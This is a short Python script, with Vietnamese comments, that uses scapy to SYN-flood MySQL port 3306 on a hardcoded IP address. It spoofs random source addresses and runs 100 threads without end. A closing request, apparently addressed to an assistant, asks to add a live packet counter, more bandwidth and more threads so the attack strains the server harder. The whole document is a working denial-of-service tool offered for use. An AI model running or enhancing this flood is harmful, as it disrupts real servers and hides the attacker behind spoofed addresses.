from scapy.all import *
import random
import threading

# Nhập IP mục tiêu và cổng (3306)
target_ip = "160.191.54.55"  # Đổi thành IP máy chủ MySQL 
target_port = 3306

# Hàm tạo địa chỉ IP ngẫu nhiên
def random_ip():
    return ".".join(map(str, (random.randint(1, 255) for _ in range(4))))

# Hàm gửi gói SYN liên tục
def syn_flood():
    while True:
        # Tạo IP giả ngẫu nhiên
        src_ip = random_ip()
        src_port = random.randint(1024, 65535)

        # Xây dựng gói TCP SYN
        ip = IP(src=src_ip, dst=target_ip)
        tcp = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1000, 9000))
        pkt = ip / tcp

        # Gửi gói tin
        send(pkt, verbose=False)

# Tạo nhiều luồng để tăng tốc độ
num_threads = 100  # Số luồng (Tăng nếu cần)
threads = []

for _ in range(num_threads):
    t = threading.Thread(target=syn_flood)
    t.daemon = True
    threads.append(t)
    t.start()

# Chạy tấn công vô hạn
while True:
    pass

với script này, thêm realtime packet đã gửi, tăng thêm bandwidth, tăng thêm luồng, tôi kiểm tra server local thấy nó không tốn nhiều tài nguyên
